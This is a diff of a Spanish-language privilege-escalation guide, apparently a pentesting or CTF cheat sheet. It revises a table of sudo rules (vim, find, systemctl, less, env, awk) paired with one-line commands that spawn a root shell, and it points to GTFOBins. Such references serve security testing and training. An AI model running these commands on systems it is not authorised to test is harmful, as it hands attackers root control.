@@ -29,11 +29,11 @@ Cada línea es una vía:
 |---|---|
 | `(ALL) NOPASSWD: /usr/bin/vim` | `sudo vim -c ':!/bin/sh'` |
 | `... /usr/bin/find` | `sudo find . -exec /bin/sh \; -quit` |
-| `... /bin/systemctl` | `sudo systemctl edit`, unit propia con `ExecStart=/bin/sh` |
+| `... /bin/systemctl` | `sudo systemctl` (pager → `!sh`) o `systemctl link` de una unit con `ExecStart=/bin/sh` + `enable --now` |
 | `... /usr/bin/less` | `!sh` desde el paginador |
 | `... /usr/bin/env` | `sudo env /bin/sh` |
 
-GTFOBins es la referencia: busca el binario y el apartado **Sudo**. Cuidado con las reglas que permiten argumentos comodín: `sudo /usr/bin/awk '*'` suele ser ejecución directa.
+GTFOBins es la referencia: busca el binario y el apartado **Sudo**. Cuidado con las reglas que permiten argumentos comodín: con `/usr/bin/awk *` la ejecución es directa, `sudo awk 'BEGIN {system("/bin/sh")}'`.
 
 ## 3. SUID y capabilities
 
